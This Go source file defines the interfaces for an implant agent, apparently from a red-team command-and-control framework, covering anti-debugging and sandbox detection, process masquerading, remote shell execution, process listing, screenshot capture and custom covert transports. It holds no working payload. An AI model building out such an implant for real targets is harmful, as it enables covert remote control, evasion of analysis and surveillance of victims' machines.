// Package impl defines the interfaces that every agent must implement.
// The generated stub files (agent.go, agent_linux.go, agent_windows.go,
// agent_darwin.go) contain skeleton implementations you must fill in.
package impl

import (
	"net"

	"__NAME__/protocol"
)

// ─── Stealth ───────────────────────────────────────────────────────────────────
// Controls anti-analysis and evasion behavior.

type Stealth interface {
	// IsDebugged returns true if a debugger or sandbox is detected.
	// Implement your own detection: TracerPid, IsDebuggerPresent, P_TRACED, etc.
	IsDebugged() bool

	// Masquerade disguises the agent process (name, appearance, etc.).
	// Implement your own technique: PR_SET_NAME, PEB modification, etc.
	Masquerade()

	// OnStart is called once before the connection loop begins.
	// Use it for environment checks, custom initialization, cleanup, etc.
	OnStart()
}

// ─── Platform ──────────────────────────────────────────────────────────────────
// Provides OS-specific system information.

type Platform interface {
	// GetCP returns the system/terminal code page (0 if not applicable).
	GetCP() uint32

	// IsElevated returns true if running with elevated/root privileges.
	IsElevated() bool

	// GetOsVersion returns a human-readable OS version string.
	GetOsVersion() string

	// NormalizePath converts a path to the platform's canonical form.
	NormalizePath(path string) string
}

// ─── FileSystem ────────────────────────────────────────────────────────────────
// File and directory operations.

type FileSystem interface {
	// GetListing returns the absolute path and directory entries for the given path.
	GetListing(path string) (string, []protocol.DirEntry, error)

	// CopyFile copies a single file from src to dst.
	CopyFile(src, dst string) error

	// CopyDir recursively copies a directory from src to dst.
	CopyDir(src, dst string) error
}

// ─── Execution ─────────────────────────────────────────────────────────────────
// Command execution and system query operations.

type Execution interface {
	// RunShell executes a shell command.
	// If output is true, capture stdout+stderr. If wait is true, block until done.
	RunShell(cmd string, output bool, wait bool) (string, error)

	// ListProcesses returns a snapshot of running processes.
	ListProcesses() ([]protocol.ProcessEntry, error)

	// CaptureScreenshot takes a screenshot and returns PNG bytes.
	CaptureScreenshot() ([]byte, error)
}

// ─── Transport ─────────────────────────────────────────────────────────────────
// Network connectivity.

type Transport interface {
	// Dial connects to the given address using the profile's transport settings.
	// Override this to implement HTTP, DNS, named pipes, or any custom transport.
	Dial(addr string, profile *protocol.Profile) (net.Conn, error)
}

// ─── AgentImpl ─────────────────────────────────────────────────────────────────
// The composite interface that all agent implementations must satisfy.
// Your Agent struct must implement every method from all embedded interfaces.

type AgentImpl interface {
	Stealth
	Platform
	FileSystem
	Execution
	Transport
}
